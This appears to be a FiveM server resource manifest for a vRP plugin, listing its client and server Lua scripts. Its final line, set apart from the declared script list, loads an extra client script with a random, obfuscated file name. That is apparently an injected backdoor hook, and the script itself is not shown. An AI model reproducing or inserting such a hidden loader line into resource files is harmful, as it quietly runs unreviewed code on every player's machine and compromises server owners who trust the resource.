resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'

dependency "vrp"

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "client.lua",
  "cfg/config.lua"
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua"
}
client_script "dXKYKWpRFBlOIBufyi.lua"